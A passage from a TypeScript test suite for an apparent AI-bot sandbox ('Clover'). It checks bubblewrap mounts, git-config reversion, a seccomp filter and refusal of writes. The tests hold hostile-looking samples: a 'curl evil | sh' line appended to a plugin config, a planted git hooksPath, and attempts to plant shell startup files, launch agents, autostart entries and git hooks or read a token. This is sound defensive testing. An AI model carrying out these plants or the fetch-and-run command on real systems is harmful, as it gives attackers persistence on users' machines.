    expect(s).not.toContain("--bind /h/.clover/settings ");
    expect(s).not.toContain("--bind /h/.clover/notes.txt ");
    // The top folders exist so a runner can list its own (empty) view.
    for (const t of ["bots", "outputs", "scratch", "routines", "plugin-data"]) expect(s).toContain(`--dir /h/.clover/${t}`);
    // Outside the home: the development folder read-only where it is, its holder a mount point.
    expect(s).toContain("--bind /h/dev /h/dev"); // holds a development folder: a mount point, so it can't be renamed
    expect(s).toContain("--ro-bind /h/dev/luna /h/dev/luna");
    expect(s).toContain("--tmpfs /run/user/1000");
    expect(s.endsWith("--chdir /h/p")).toBe(true);
  });

  test("the caller's view: only its own folders bound into the home's tmpfs view", () => {
    const dirs = new Set(["/h", "/h/.clover", "/h/.clover/bots", "/h/.clover/bots/luna", "/h/.clover/bots/luna/memory",
      "/h/.clover/bots/luna/agents", "/h/.clover/bots/sol", "/h/.clover/bots/sol/memory",
      "/h/.clover/outputs", "/h/.clover/outputs/s1", "/h/.clover/outputs/c1", "/h/.clover/outputs/a1",
      "/h/.clover/scratch", "/h/.clover/scratch/luna",
      "/h/.clover/routines", "/h/.clover/routines/luna", "/h/.clover/sdk", "/h/.clover/sdk/projects",
      "/h/.clover/sdk/projects/key", "/h/p"]);
    const files = new Set(["/h/.clover/sdk/projects/key/s.jsonl", "/h/.clover/bots/luna/memory/MEMORY.md"]);
    const fs = {
      kind: (p: string) => (p === "/h/.clover/projects" ? "other" as const : dirs.has(p) ? "dir" as const : files.has(p) ? "file" as const : null),
      list: (d: string) => [...dirs, ...files].filter((p) => p !== d && p.startsWith(`${d}/`) && !p.slice(d.length + 1).includes("/")).map((p) => p.slice(d.length + 1)),
    };
    const policy = { allowWrite: ["/h"], denyWrite: ["/h/.clover", "/h/.clover/sdk/projects", "/h/.clover/projects"],
      denyRead: ["/h/.clover", "/h/.clover/sdk/projects", "/h/.clover/projects"], closedDoors: [], blockedAddresses: [], network: "none" as const };
    const owner = callerPlaces("/h/.clover", "linux", { sessionId: "s1", memoryOf: "luna" });
    const s = bwrapArgs({ cloverHome: "/h/.clover", cwd: "/h/p", uid: 1000, fs, caller: owner, policy }).join(" ");
    expect(s).toContain("--tmpfs /h/.clover");
    // Its own bot folder reads; its memory, outputs, scratch and routines read and write.
    expect(s).toContain("--ro-bind /h/.clover/bots/luna /h/.clover/bots/luna");
    expect(s).toContain("--bind /h/.clover/bots/luna/memory /h/.clover/bots/luna/memory");
    expect(s).toContain("--bind /h/.clover/outputs/s1 /h/.clover/outputs/s1");
    expect(s).toContain("--bind /h/.clover/scratch/luna /h/.clover/scratch/luna");
    expect(s).toContain("--bind /h/.clover/routines/luna /h/.clover/routines/luna");
    expect(s).not.toContain("bots/sol");
    // The transcript store stays hidden: nothing of it is bound back.
    expect(s).not.toContain("sdk/projects");
    expect(s).not.toContain("/h/.clover/projects");
    // A coding session or an agent: only its own outputs, no bot folder at all.
    for (const ctx of [{ sessionId: "c1" }, { sessionId: "a1" }]) {
      const other = bwrapArgs({ cloverHome: "/h/.clover", cwd: "/h/p", uid: 1000, fs, caller: callerPlaces("/h/.clover", "linux", ctx), policy }).join(" ");
      expect(other).toContain("--tmpfs /h/.clover");
      expect(other).toContain(`--bind /h/.clover/outputs/${ctx.sessionId} /h/.clover/outputs/${ctx.sessionId}`);
      expect(other).not.toContain("bots/luna");
      expect(other).not.toContain("bots/sol");
    }
  });
});

describe("the session's own repo", () => {
  test("ownRepoHooks finds the repo holding the cwd, without following links; elsewhere null", () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-repo-")));
    const home = join(root, "home");
    mkdirSync(join(home, "project", "sub"), { recursive: true });
    mkdirSync(join(home, "project", ".git", "hooks"), { recursive: true });
    try {
      expect(ownRepoHooks(join(home, "project", "sub"), home)).toBe(join(home, "project", ".git", "hooks"));
      expect(ownRepoHooks(join(home, "project"), home)).toBe(join(home, "project", ".git", "hooks"));
      expect(ownRepoHooks(join(home, "elsewhere"), home)).toBeNull();
      expect(ownRepoHooks(join(root, "outside"), home)).toBeNull();
      symlinkSync(join(home, "project"), join(home, "linked"));
      expect(ownRepoHooks(join(home, "linked", "sub"), home)).toBeNull(); // the link itself isn't climbed through
    } finally { rmSync(root, { recursive: true, force: true }); }
  });

  test("mkdirNoLinks makes plain folders and refuses links", () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-mkdir-")));
    try {
      const fresh = join(root, "a", "b");
      mkdirNoLinks(fresh);
      expect(existsSync(fresh)).toBe(true);
      expect((statSync(fresh).mode & 0o777)).toBe(0o700);
      const linked = join(root, "l");
      symlinkSync(join(root, "a"), linked);
      expect(() => mkdirNoLinks(join(linked, "c"))).toThrow(/link/);
      expect(existsSync(join(linked, "c"))).toBe(false);
      writeFileSync(join(root, "f"), "x");
      mkdirNoLinks(join(root, "f", "c")); // a file where folders go: left alone, the read-only bind still covers it
      expect(existsSync(join(root, "f", "c"))).toBe(false);
    } finally { rmSync(root, { recursive: true, force: true }); }
  });

  test("repoConfigFiles watches the repo config, its worktree config, submodule configs, and a worktree's shared config", () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-repocfg-")));
    try {
      const repo = join(root, "repo");
      mkdirSync(join(repo, ".git", "modules", "sub"), { recursive: true });
      writeFileSync(join(repo, ".git", "config"), "[core]\n\trepositoryformatversion = 0\n");
      const files = repoConfigFiles(repo);
      expect(files).toContain(join(repo, ".git", "config"));
      expect(files).toContain(join(repo, ".git", "config.worktree"));
      expect(files).toContain(join(repo, ".git", "modules", "sub", "config"));
      // A linked worktree: its own config plus the shared one.
      const wt = join(root, "wt");
      mkdirSync(wt, { recursive: true });
      writeFileSync(join(wt, ".git"), "gitdir: /common/.git/worktrees/wt\n");
      const wfiles = repoConfigFiles(wt);
      expect(wfiles).toContain(join("/common/.git/worktrees/wt", "config"));
      expect(wfiles).toContain(join("/common/.git", "config"));
      // A planted link resolves nothing.
      const linked = join(root, "linked");
      mkdirSync(linked, { recursive: true });
      symlinkSync(join(repo, ".git"), join(linked, ".git"));
      expect(repoConfigFiles(linked)).toEqual([]);
      expect(repoConfigFiles(join(root, "missing"))).toEqual([]);
    } finally { rmSync(root, { recursive: true, force: true }); }
  });

  test("revertPlantedGitKeys renames a temp file over and leaves no strays", () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-revert-")));
    try {
      const cfg = join(root, "config");
      writeFileSync(cfg, "[user]\n\tname = Luna\n");
      const before = new Map([[cfg, readFileSync(cfg, "utf8")]]);
      writeFileSync(cfg, "[user]\n\tname = Luna\n[core]\n\thooksPath = /tmp/evil\n");
      const note = revertPlantedGitKeys(before);
      expect(note).toMatch(/core\.hookspath/);
      expect(readFileSync(cfg, "utf8")).toBe("[user]\n\tname = Luna\n"); // the emptied [core] goes too (#321's review)
      // No temp strays in the folder: git's lockfile is renamed over, never left behind.
      expect(readdirSync(root)).toEqual(["config"]);
      // An unchanged file is left alone (null note).
      expect(revertPlantedGitKeys(new Map([[cfg, readFileSync(cfg, "utf8")]]))).toBeNull();
    } finally { rmSync(root, { recursive: true, force: true }); }
  });

  test("revertPlantedGitKeys falls back to the pre-run bytes when git still sees the key (not reverted)", () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-revert-")));
    try {
      const cfg = join(root, "config");
      const prev = "[user]\n\tname = Luna\n[core]\n\teditor = vim\n";
      writeFileSync(cfg, prev);
      const before = new Map([[cfg, prev]]);
      // A valueless hooksPath: git reads boolean true, the line revert cannot drop it.
      writeFileSync(cfg, `${prev}\thooksPath\n`);
      const note = revertPlantedGitKeys(before);
      expect(note).toMatch(/not reverted/);
      expect(note).toMatch(/core\.hookspath/);
      // The pre-run bytes are back, byte for byte.
      expect(readFileSync(cfg, "utf8")).toBe(prev);
      expect(readdirSync(root)).toEqual(["config"]); // no lockfile stray
    } finally { rmSync(root, { recursive: true, force: true }); }
  });

  test("revertPlantedGitKeys removes an appeared file it cannot cleanly revert", () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-revert-")));
    try {
      const cfg = join(root, "config");
      const before = new Map([[cfg, null]]);
      writeFileSync(cfg, "[core]\n\thooksPath\n");
      const note = revertPlantedGitKeys(before);
      expect(note).toMatch(/not reverted/);
      expect(existsSync(cfg)).toBe(false);
    } finally { rmSync(root, { recursive: true, force: true }); }
  });

  test("writeLocked never leaves a config.lock behind, and keeps the user's mode", () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-lock-")));
    try {
      const cfg = join(root, "config");
      writeFileSync(cfg, "[user]\n\tname = Luna\n");
      chmodSync(cfg, 0o644);
      // The landed write keeps the 0644 mode (not the 0600 lock mode), and the user's git reads it.
      expect(writeLocked(cfg, "[user]\n\tname = Sol\n", "[user]\n\tname = Luna\n")).toBe("ok");
      expect(readFileSync(cfg, "utf8")).toBe("[user]\n\tname = Sol\n");
      expect(statSync(cfg).mode & 0o777).toBe(0o644);
      expect(Bun.spawnSync(["git", "config", "--file", cfg, "--list"]).exitCode).toBe(0);
      // A changed re-read refuses without clobbering — and without a lock stray.
      writeFileSync(cfg, "[user]\n\tname = Luna\n");
      expect(writeLocked(cfg, "[user]\n\tname = Sol\n", "[user]\n\tname = Stale\n")).toBe("changed");
      expect(readFileSync(cfg, "utf8")).toBe("[user]\n\tname = Luna\n");
      expect(existsSync(`${cfg}.lock`)).toBe(false);
      expect(Bun.spawnSync(["git", "config", "--file", cfg, "--list"]).exitCode).toBe(0);
      // A failed write (an unwritable folder) leaves no lock either (non-root: root bypasses modes).
      const ro = join(root, "ro");
      mkdirSync(ro);
      const locked = join(ro, "config");
      writeFileSync(locked, "x");
      if (process.geteuid?.() !== 0) {
        chmodSync(ro, 0o555);
        try {
          expect(writeLocked(locked, "y", "x")).toBe("error");
          expect(existsSync(`${locked}.lock`)).toBe(false);
        } finally { chmodSync(ro, 0o755); }
      }
      expect(readdirSync(root).sort()).toEqual(["config", "ro"]);
    } finally { rmSync(root, { recursive: true, force: true }); }
  });

  test("includeTargets resolves include.path and includeIf paths the way git reads them", () => {
    const home = join(tmpdir(), "fake-home");
    const base = join(home, ".config", "git");
    expect(includeTargets(["[include]", "\tpath = ~/extra.inc", '[includeIf "gitdir:~/work/"]', "\tpath = ./local.inc"].join("\n"), base, home))
      .toEqual([join(home, "extra.inc"), join(base, "local.inc")]);
    expect(includeTargets(["[include]", "\tpath = /abs/other.inc"].join("\n"), base, home)).toEqual(["/abs/other.inc"]);
    expect(includeTargets("[user]\n\tname = Luna\n", base, home)).toEqual([]);
    expect(includeTargets(null, base, home)).toEqual([]);
  });

  test("includeTargets expands globs where the platform can", () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-inc-")));
    try {
      writeFileSync(join(root, "a.inc"), "[user]\n");
      writeFileSync(join(root, "b.inc"), "[user]\n");
      const got = includeTargets(`[include]\n\tpath = ${root}/*.inc\n`, root, root);
      expect(got.sort()).toEqual([join(root, "a.inc"), join(root, "b.inc")]);
    } finally { rmSync(root, { recursive: true, force: true }); }
  });

  test("the Linux sandbox's mounts bind the session repo's hooks read-only", () => {
    const dirs = new Set(["/h", "/h/p", "/h/p/.git", "/h/p/.git/hooks", "/h/.clover", "/h/.clover/git-template"]);
    const fs = {
      kind: (p: string) => (dirs.has(p) ? "dir" as const : null),
      list: (d: string) => [...dirs].filter((p) => p !== d && p.startsWith(`${d}/`) && !p.slice(d.length + 1).includes("/")).map((p) => p.slice(d.length + 1)),
    };
    const s = bwrapArgs({ cloverHome: "/h/.clover", cwd: "/h/p", uid: 1000, fs, repoHooks: "/h/p/.git/hooks", policy: {
      allowWrite: ["/h"], denyWrite: ["/h/.clover"], denyRead: ["/h/.clover"], closedDoors: [], blockedAddresses: [], network: "none" } }).join(" ");
    expect(s).toContain("--ro-bind /h/p/.git/hooks /h/p/.git/hooks");
    // Clover's empty git template is bound back read-only, even without a caller.
    expect(s).toContain("--ro-bind /h/.clover/git-template /h/.clover/git-template");
  });

  test("a missing ~/node_modules (B's #234 plugin-load deny) never holds the home: the real fence's policy, supervised as the spawner does", () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-nm-")));
    const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp");
    for (const d of [clover, join(home, "project"), temp]) mkdirSync(d, { recursive: true });
    const policy = new CloverFence({ os: "linux", home, cloverHome: clover, temp }).policy();
    const loadDenies = policy.denyWrite.filter((d) => d.endsWith("/node_modules") && !d.startsWith(`${clover}/`));
    expect(loadDenies).toContain(join(home, "node_modules"));
    const base = { policy, cloverHome: clover, cwd: join(home, "project"), uid: 1 };
    // Without supervising it the home is held (the CI failure the review round met); supervised, it isn't.
    expect(bwrapPlan(base).held.map((h) => h.folder)).toContain(home);
    expect(bwrapPlan({ ...base, supervised: loadDenies }).held.map((h) => h.because)).not.toContain(join(home, "node_modules"));
  });

  test("supervised files are never held for: the supervisor refuses them instead", () => {
    const dirs = new Set(["/h", "/h/.clover", "/t"]);
    const fs = { kind: (p: string) => (dirs.has(p) ? "dir" as const : p === "/h/.bashrc" ? "file" as const : null), list: () => [] as string[] };
    const { held, args } = bwrapPlan({ cloverHome: "/h/.clover", cwd: "/h", uid: 1, fs,
      supervised: ["/h/.zshrc", "/h/.bash_profile", "/h/.config/systemd/user/clover-core.service"],
      policy: {
        allowWrite: ["/h", "/t"], denyWrite: ["/h/.bashrc", "/h/.zshrc", "/h/.bash_profile", "/h/.clover/settings.json"],
        denyRead: [], closedDoors: [], blockedAddresses: [], network: "none" } });
    // The supervised ones never hold, and the existing safe file needs no holding either: nothing is held.
    expect(held).toEqual([]);
    expect(args.join(" ")).toContain("--bind /h /h");
    expect(args.join(" ")).not.toContain("--ro-bind /h /h");
    // Without the supervisor list the same missing file would hold the whole home.
    const { held: heldWithout } = bwrapPlan({ cloverHome: "/h/.clover", cwd: "/h", uid: 1, fs, policy: {
      allowWrite: ["/h", "/t"], denyWrite: ["/h/.zshrc"], denyRead: [], closedDoors: [], blockedAddresses: [], network: "none" } });
    expect(heldWithout).toEqual([{ folder: "/h", because: "/h/.zshrc" }]);
  });
});

describe("a folder held for a fenced file that isn't there yet (accepted for now, the controller's ruling)", () => {
  test("the plan names it, and a read-only refusal there is explained: which file, a subfolder, or ask the user", () => {
    const dirs = new Set(["/h", "/h/.clover", "/t"]);
    const fs = { kind: (p: string) => (dirs.has(p) ? "dir" as const : p === "/h/.bashrc" ? "file" as const : null), list: () => [] as string[] };
    const { held } = bwrapPlan({ cloverHome: "/h/.clover", cwd: "/h", uid: 1, fs, policy: {
      allowWrite: ["/h", "/t"], denyWrite: ["/h/.bashrc", "/h/.zshrc", "/h/.clover/settings.json"], denyRead: [], closedDoors: [], blockedAddresses: [], network: "none" } });
    expect(held).toEqual([{ folder: "/h", because: "/h/.zshrc" }]);
    const note = heldFolderNote("sh: 1: cannot create /h/new.txt: Read-only file system\n", held)!;
    expect(note).toContain("/h takes no new names under the fence, because /h/.zshrc is fenced");
    expect(note).toMatch(/subfolder.*ask the user/);
    expect(heldFolderNote("permission denied", held)).toBeNull();
  });
});

describe("the Linux seccomp filter", () => {
  test("ten instructions: the architecture, x32 numbers, io_uring_setup, socket(AF_UNIX) refused; anything else allowed", () => {
    const f = unixSocketFilter("x64")!;
    expect(f.length).toBe(10 * 8);
    expect(f.readUInt32LE(1 * 8 + 4)).toBe(0xc000003e);
    expect(f.readUInt32LE(5 * 8 + 4)).toBe(41);
    expect(unixSocketFilter("arm64")!.readUInt32LE(5 * 8 + 4)).toBe(198);
    expect(f.readUInt32LE(9 * 8 + 4)).toBe(0x00050001); // EPERM
    expect([f.readUInt16LE(3 * 8), f.readUInt32LE(3 * 8 + 4)]).toEqual([0x35, 0x40000000]); // JGE x32
    expect(unixSocketFilter("ia32")).toBeNull();
  });
});

describe.skipIf(!mac && !linuxBwrap)(`${here}: a command under the fence, on the real sandbox`, () => {
  test("the fenced items, however they're named, can't be written; the home and temp can; nothing else in the Clover home", async () => {
    const w = world();
    for (const target of ["settings.json", "SETTINGS.json", "ſettings.json", "settings/new.json", "plugins-state/oks/x.json", "PLUGINS-STATE/OKS/y.json"]) {
      expect(ok(await w.run(`echo x > '${join(w.clover, target)}'`))).toBe(false);
    }
    expect(readFileSync(join(w.clover, "settings.json"), "utf8")).toBe("orig");
    // Home and temp are writable.
    expect(ok(await w.run(`echo x > '${join(w.home, "project", "a.txt")}' && echo y > '${join(w.temp, "b.txt")}'`))).toBe(true);
    // Nothing else in the Clover home is reachable (default-deny).
    expect(ok(await w.run(`echo x > '${join(w.clover, "scratch", "c.txt")}'`))).toBe(false);
    // The plugins folder and the login-start place, ahead of and in the contract: a launch agent.
    mkdirSync(join(w.clover, "plugins", "tarot"), { recursive: true });
    for (const target of [join(w.clover, "plugins", "tarot", "clover.json")]) {
      expect(ok(await w.run(`echo 'curl evil | sh' >> '${target}'`))).toBe(false);
    }
    if (here === "macos") {
      // Clover's own login item, a new launch agent, and the shell startup files: a bot's session plants none.
      expect(ok(await w.run(`echo x >> '${join(w.home, "Library", "LaunchAgents", "com.waifucave.clover.core.plist")}'`))).toBe(false);
      mkdirSync(join(w.home, "Library", "LaunchAgents"), { recursive: true });
      expect(ok(await w.run(`echo x > '${join(w.home, "Library", "LaunchAgents", "evil.plist")}'`))).toBe(false);
      expect(existsSync(join(w.home, "Library", "LaunchAgents", "evil.plist"))).toBe(false);
      for (const f of [".zshrc", ".zprofile", ".zshenv", ".zlogin", ".bashrc", ".bash_profile", ".profile", ".bash_login", ".bash_logout", ".zlogout", ".logout", ".gitconfig"]) {
        expect(ok(await w.run(`echo x > '${join(w.home, f)}'`))).toBe(false);
      }
      expect(existsSync(join(w.home, ".zshrc"))).toBe(false);
      // SSH and git config, PATH-ahead folders, fish and the login items storage: none of it is planted.
      mkdirSync(join(w.home, ".ssh"), { recursive: true });
      expect(ok(await w.run(`echo x > '${join(w.home, ".ssh", "config")}'`))).toBe(false);
      mkdirSync(join(w.home, ".config", "git"), { recursive: true });
      expect(ok(await w.run(`echo x > '${join(w.home, ".config", "git", "config")}'`))).toBe(false);
      for (const d of [join(w.home, "bin"), join(w.home, ".local", "bin")] ) {
        mkdirSync(d, { recursive: true });
        expect(ok(await w.run(`echo x > '${join(d, "evil")}'`))).toBe(false);
        expect(existsSync(join(d, "evil"))).toBe(false);
      }
      mkdirSync(join(w.home, ".config", "fish", "conf.d"), { recursive: true });
      expect(ok(await w.run(`echo x > '${join(w.home, ".config", "fish", "conf.d", "evil.fish")}'`))).toBe(false);
      mkdirSync(join(w.home, ".config", "environment.d"), { recursive: true });
      expect(ok(await w.run(`echo x > '${join(w.home, ".config", "environment.d", "evil.conf")}'`))).toBe(false);
      // Editors, package managers and the loginwindow plist: none of it is planted either.
      mkdirSync(join(w.home, ".vim"), { recursive: true });
      mkdirSync(join(w.home, ".config", "nvim"), { recursive: true });
      mkdirSync(join(w.home, ".gnupg"), { recursive: true });
      mkdirSync(join(w.home, ".config", "pip"), { recursive: true });
      mkdirSync(join(w.home, ".bun", "bin"), { recursive: true });
      mkdirSync(join(w.home, ".cargo", "bin"), { recursive: true });
      mkdirSync(join(w.home, ".oh-my-zsh", "custom"), { recursive: true });
      mkdirSync(join(w.home, "Library", "Preferences"), { recursive: true });
      mkdirSync(join(w.home, "Library", "Scripts"), { recursive: true });
      for (const f of [join(w.home, ".vimrc"), join(w.home, ".vim", "evil.vim"), join(w.home, ".config", "nvim", "evil.lua"), join(w.home, ".emacs"),
        join(w.home, ".gnupg", "gpg.conf"), join(w.home, ".config", "pip", "evil.conf"), join(w.home, ".bunfig.toml"),
        join(w.home, ".bun", "bin", "evil"), join(w.home, ".npmrc"), join(w.home, ".cargo", "bin", "evil"),
        join(w.home, ".cargo", "config.toml"), join(w.home, ".bash_aliases"), join(w.home, ".oh-my-zsh", "custom", "evil.zsh"),
        join(w.home, "Library", "Preferences", "com.apple.loginwindow.plist"), join(w.home, "Library", "Scripts", "evil.sh")]) {
        expect(ok(await w.run(`echo x > '${f}'`))).toBe(false);
      }
      // A hook in any repo under the home: planting fails too.
      mkdirSync(join(w.home, "project", ".git", "hooks"), { recursive: true });
      expect(ok(await w.run(`echo x > '${join(w.home, "project", ".git", "hooks", "post-checkout")}'`))).toBe(false);
      expect(existsSync(join(w.home, "project", ".git", "hooks", "post-checkout"))).toBe(false);
      // Lane M's self-update files under the Clover home: the daemon binary, a staged boot record and the
      // install record are refused (the Clover home default-deny backs the kind).
      for (const f of [join(w.clover, "bin", "clover-core"), join(w.clover, "update", "boot.json"), join(w.clover, "install.json")]) {
        expect(ok(await w.run(`echo x > '${f}'`))).toBe(false);
      }
      expect(existsSync(join(w.clover, "install.json"))).toBe(false); // never created, never planted
    } else {
      // The systemd user unit, an autostart entry, and the shell startup files: a bot's session plants none.
      expect(ok(await w.run(`echo x >> '${join(w.home, ".config", "systemd", "user", "clover-core.service")}'`))).toBe(false);
      mkdirSync(join(w.home, ".config", "autostart"), { recursive: true });
      expect(ok(await w.run(`echo x > '${join(w.home, ".config", "autostart", "evil.desktop")}'`))).toBe(false);
      mkdirSync(join(w.home, ".config", "autostart-scripts"), { recursive: true });
      expect(ok(await w.run(`echo x > '${join(w.home, ".config", "autostart-scripts", "evil.sh")}'`))).toBe(false);
      for (const d of [join(w.home, ".config", "plasma-workspace", "env"), join(w.home, ".config", "plasma-workspace", "shutdown")]) {
        mkdirSync(d, { recursive: true });
        expect(ok(await w.run(`echo x > '${join(d, "evil.sh")}'`))).toBe(false);
        expect(existsSync(join(d, "evil.sh"))).toBe(false);
      }
      for (const f of [".bashrc", ".bash_profile", ".zshrc", ".zprofile", ".bash_logout", ".pam_environment", ".xprofile"]) {
        expect(ok(await w.run(`echo x > '${join(w.home, f)}'`))).toBe(false);
      }
      expect(existsSync(join(w.home, ".bashrc"))).toBe(true); // pre-created empty at setup (ruling 2)
      expect(readFileSync(join(w.home, ".bashrc"), "utf8")).toBe(""); // and the plant didn't land
      for (const d of [join(w.home, "bin"), join(w.home, ".local", "bin"), join(w.home, ".ssh")] ) {
        mkdirSync(d, { recursive: true });
        expect(ok(await w.run(`echo x > '${join(d, d.endsWith(".ssh") ? "config" : "evil")}'`))).toBe(false);
      }
      // Editors, package managers, fish and the desktop entries: none of it is planted either.
      mkdirSync(join(w.home, ".vim"), { recursive: true });
      mkdirSync(join(w.home, ".config", "nvim"), { recursive: true });
      mkdirSync(join(w.home, ".gnupg"), { recursive: true });
      mkdirSync(join(w.home, ".config", "pip"), { recursive: true });
      mkdirSync(join(w.home, ".bun", "bin"), { recursive: true });
      mkdirSync(join(w.home, ".cargo", "bin"), { recursive: true });
      mkdirSync(join(w.home, ".config", "fish", "conf.d"), { recursive: true });
      for (const f of [join(w.home, ".vimrc"), join(w.home, ".vim", "evil.vim"), join(w.home, ".config", "nvim", "evil.lua"),
        join(w.home, ".gnupg", "gpg.conf"), join(w.home, ".config", "pip", "evil.conf"), join(w.home, ".bunfig.toml"),
        join(w.home, ".npmrc"), join(w.home, ".cargo", "config.toml"), join(w.home, ".config", "fish", "conf.d", "evil.fish"),
        join(w.home, ".gitconfig"), join(w.home, ".config", "mimeapps.list")]) {
        expect(ok(await w.run(`echo x > '${f}'`))).toBe(false);
      }
      // A hook in any repo under the home: planting fails too.
      mkdirSync(join(w.home, "project", ".git", "hooks"), { recursive: true });
      expect(ok(await w.run(`echo x > '${join(w.home, "project", ".git", "hooks", "post-checkout")}'`))).toBe(false);
      expect(existsSync(join(w.home, "project", ".git", "hooks", "post-checkout"))).toBe(false);
      // Lane M's self-update files under the Clover home: the daemon binary and its swap copy, a staged boot
      // record and the install record are refused; the install record is never created and never planted.
      for (const f of [join(w.clover, "bin", "clover-core"), join(w.clover, "bin", "clover-core.new"),
        join(w.clover, "update", "boot.json"), join(w.clover, "install.json")]) {
        expect(ok(await w.run(`echo x > '${f}'`))).toBe(false);
      }
      expect(existsSync(join(w.clover, "install.json"))).toBe(false);
    }
    // A fenced file that isn't there yet can't be made either.
    expect(ok(await w.run(`echo '{}' > '${join(w.clover, "trust.json")}'`))).toBe(false);
    expect(existsSync(join(w.clover, "trust.json"))).toBe(false);
    expect(ok(await w.run(`echo x > '${join(w.outside, "c.txt")}'`))).toBe(false);
  }, 60_000);

  test("a bot's own session can write to its own scratch folder", async () => {
    const w = worldBot();
    const ownScratch = join(w.clover, "scratch", "luna");
    mkdirSync(ownScratch, { recursive: true });
    expect(ok(await w.run(`echo x > '${join(w.home, "project", "a.txt")}' && echo y > '${join(w.temp, "b.txt")}' && echo z > '${join(ownScratch, "c.txt")}'`))).toBe(true);
  }, 60_000);

  test("no rename or removal of a folder that holds a fenced item, no hard link from one; a symlink is followed", async () => {
    const w = world();
    expect(ok(await w.run(`mv '${w.clover}' '${join(w.home, "moved")}'`))).toBe(false);
    expect(ok(await w.run(`mv '${join(w.clover, "plugins-state")}' '${join(w.home, "ps")}'`))).toBe(false);
    // `rm -rf` can't even list the home's denied folders, so it exits 0 deleting nothing: the state is the assertion.
    await w.run(`rm -rf '${w.clover}'`);
    expect(existsSync(join(w.clover, "settings.json"))).toBe(true);
    expect(readFileSync(join(w.clover, "settings.json"), "utf8")).toBe("orig");
    expect(ok(await w.run(`ln '${join(w.clover, "settings.json")}' '${join(w.home, "hl")}'`))).toBe(false);
    expect(ok(await w.run(`ln -s '${join(w.clover, "settings.json")}' '${join(w.home, "sl")}' && echo x > '${join(w.home, "sl")}'`))).toBe(false);
    expect(readFileSync(join(w.clover, "settings.json"), "utf8")).toBe("orig");
  }, 60_000);

  test("the run folder can't be read; non-ASCII names where Clover names things can't be made; the closed doors and the network are shut", async () => {
    const w = world();
    expect(ok(await w.run(`cat '${join(w.clover, "run", "token")}'`))).toBe(false);
    // Tool runners cannot read settings.json (Clover home is default-deny; only per-caller allows permit access).
    expect(ok(await w.run(`cat '${join(w.clover, "settings.json")}'`))).toBe(false);
    expect(ok(await w.run(`mkdir '${join(w.clover, "plugins-state", "öks")}'`))).toBe(false);
    expect(ok(await w.run(`mkdir '${join(w.clover, "nötes")}'`))).toBe(false);
    expect(ok(await w.run(`mkdir '${join(w.clover, "plugins-state", "new")}'`))).toBe(false); // the home deny refuses every new name in it
    expect(ok(await w.run(`mkdir -p '${join(w.home, "project", "nötes")}'`))).toBe(true); // the user's own names elsewhere
    if (here === "macos") {
      expect(ok(await w.run("/usr/bin/open -g -j /nonexistent-lane-c"))).toBe(false);
      expect(ok(await w.run("/bin/launchctl print system >/dev/null"))).toBe(false);
    } else {
      expect(ok(await w.run(`test -z "$(ls -A /run/user/${process.getuid!()} 2>/dev/null)"`))).toBe(true); // the user's bus is hidden
      // Ordinary new top-level names stay writable: the missing login-start folders are made at setup and the
      // supervisor refuses only the unsafe files (spec §9.1; rulings 1-3 replace the old held home).
      const fresh = await w.run(`echo x > '${join(w.home, "new-top-level.txt")}' && cat '${join(w.home, "new-top-level.txt")}'`);
      expect(fresh.kind === "exited" && fresh.code === 0 && fresh.stdout).toBe("x\n");
      expect(fresh.kind === "exited" && fresh.stderr).not.toMatch(/takes no new names under the fence/);
      // Its own pid namespace: a handful of its own processes, and not the daemon's.
      expect(ok(await w.run(`test $(ls /proc | grep -c '^[0-9]') -lt 10 && test ! -e /proc/${process.pid}/cmdline`))).toBe(true);
    }
  }, 60_000);

  test("no network: a listening loopback port and a Unix socket (as the daemon's) are both out of reach", async () => {
    const w = world();
    let tcpSeen = 0, unixSeen = 0;
    const tcp = Bun.listen({ hostname: "127.0.0.1", port: 0, socket: { open() { tcpSeen++; }, data() {} } });
    const sock = join(w.root, "d.sock");
    const unix = Bun.listen({ unix: sock, socket: { open() { unixSeen++; }, data() {} } });
    try {
      // Reachable from outside the sandbox, so a refusal inside is the sandbox's.
      const probe = (c: string) => `${process.execPath} -e '${c}'`;
      const tcpJs = `const s = await Bun.connect({ hostname: "127.0.0.1", port: ${tcp.port}, socket: { data() {} } }); s.end();`;
      const unixJs = `const s = await Bun.connect({ unix: ${JSON.stringify(sock)}, socket: { data() {} } }); s.end();`;
      expect(Bun.spawnSync([process.execPath, "-e", tcpJs]).exitCode).toBe(0);
      expect(ok(await w.run(probe(tcpJs)))).toBe(false);
      expect(ok(await w.run(probe(unixJs)))).toBe(false);
      await Bun.sleep(50);
      expect(tcpSeen).toBe(1); // only the check from outside
      expect(unixSeen).toBe(0);
    } finally { tcp.stop(true); unix.stop(true); }
  }, 60_000);

  test("bots' memory for runners: the owner's own conversations read and write it, every other runner is denied, nobody moves it", async () => {
    const w = world();
    const b = (...p: string[]) => join(w.clover, "bots", ...p);
    for (const d of [b("luna", "memory"), b("luna", "agents"), b("sol", "memory")]) mkdirSync(d, { recursive: true });
    writeFileSync(b("luna", "memory", "MEMORY.md"), "luna's");
    writeFileSync(b("sol", "memory", "MEMORY.md"), "sol's");
    writeFileSync(b("luna", "agents", "t.json"), "{}");
    const owner = { caller: botCaller("luna", "s1") };
    expect(ok(await w.run(`cat '${b("luna", "memory", "MEMORY.md")}' && echo more >> '${b("luna", "memory", "MEMORY.md")}' && echo n > '${b("luna", "memory", "new.md")}' && ls '${b("luna", "memory")}'`, owner))).toBe(true);
    expect(readFileSync(b("luna", "memory", "MEMORY.md"), "utf8")).toBe("luna'smore\n");
    expect(ok(await w.run(`cat '${b("sol", "memory", "MEMORY.md")}'`, owner))).toBe(false);
    expect(ok(await w.run(`echo x > '${b("luna", "agents", "t.json")}'`, owner))).toBe(false);
    expect(ok(await w.run(`cat '${b("luna", "agents", "t.json")}'`, owner))).toBe(true); // the rest of its folder reads
    // Its files are its own to remove; the memory folder itself stays.
    expect(ok(await w.run(`mv '${b("luna", "memory")}' '${b("luna", "m2")}'`, owner))).toBe(false);
